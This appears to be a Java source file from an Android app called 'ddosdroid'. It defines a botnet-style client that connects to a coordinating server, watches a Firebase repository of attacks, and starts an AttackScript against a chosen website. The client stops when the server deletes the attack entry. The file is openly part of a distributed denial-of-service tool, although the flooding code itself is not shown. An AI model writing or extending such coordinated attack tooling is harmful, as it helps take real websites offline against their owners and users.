package gr.kalymnos.sk3m3l10.ddosdroid.mvc_model.connectivity.client;

import android.content.Context;
import android.util.Log;

import gr.kalymnos.sk3m3l10.ddosdroid.mvc_model.connectivity.AttackScript;
import gr.kalymnos.sk3m3l10.ddosdroid.mvc_model.repository.AttackRepository;
import gr.kalymnos.sk3m3l10.ddosdroid.mvc_model.repository.FirebaseRepository;
import gr.kalymnos.sk3m3l10.ddosdroid.pojos.attack.Attack;

/* Note:
 * Client gets disconnected by itself when the attack that is
 * currently following is deleted from the AttackRepository.
 *
 * Details:
 * The above is usually the way where the client knows its server was shutdown.
 * They don't keep a connection for long. Their connection is live until the client
 * receives a response from server. After that client starts attacking.*/

public class Client implements ConnectionToServer.ConnectionToServerListener, AttackRepository.OnRepositoryChangeListener {
    private static final String TAG = "MyClient";

    private Context context;

    private Attack attack;
    private AttackScript attackScript;
    private AttackRepository repo;

    private ConnectionToServer serverConnection;
    private ClientConnectionListener clientConnectionListener;

    public interface ClientConnectionListener {
        void onClientConnected(Client thisClient, Attack attack);

        void onClientConnectionError();

        void onClientDisconnected(Client thisClient, Attack attack);
    }

    public Client(Context context, Attack attack) {
        initFields(context, attack);
    }

    private void initFields(Context context, Attack attack) {
        this.context = context;
        this.attack = attack;
        this.attackScript = new AttackScript(attack.getWebsite());
        initRepo();
        initServerConnection();
    }

    private void initRepo() {
        this.repo = new FirebaseRepository();
        this.repo.setOnRepositoryChangeListener(this);
    }

    private void initServerConnection() {
        ConnectionToServer.Factory factory = new ConnectionToServer.FactoryImp();
        serverConnection = factory.create(context, attack);
        serverConnection.setConnectionToServerListener(this);
    }

    public void setClientConnectionListener(ClientConnectionListener listener) {
        this.clientConnectionListener = listener;
    }

    public void connect() {
        serverConnection.connectToServer();
    }

    public void disconnect() {
        serverConnection.disconnectFromServer();
    }

    @Override
    public void onServerConnection() {
        repo.startListenForChanges();
        if (!attackScript.isAlive())
            attackScript.start();
        clientConnectionListener.onClientConnected(this, attack);
    }

    @Override
    public void onServerConnectionError() {
        serverConnection.releaseResources();
        clientConnectionListener.onClientConnectionError();
    }

    @Override
    public void onServerDisconnection() {
        clientConnectionListener.onClientDisconnected(this, attack);
        releaseResources();
    }

    private void releaseResources() {
        serverConnection.releaseResources();
        attackScript.stopExecution();
        repo.stopListenForChanges();
        context = null;
        clientConnectionListener = null;
    }

    public final String getAttackedWebsite() {
        return attack.getWebsite();
    }

    @Override
    public void onAttackUpload(Attack uploadedAttack) {
        Log.d(TAG, "onAttackUpload()");
    }

    @Override
    public void onAttackUpdate(Attack changedAttack) {
        Log.d(TAG, "onAttackUpdate()");
    }

    @Override
    public void onAttackDelete(Attack deletedAttack) {
        disconnect();
    }
}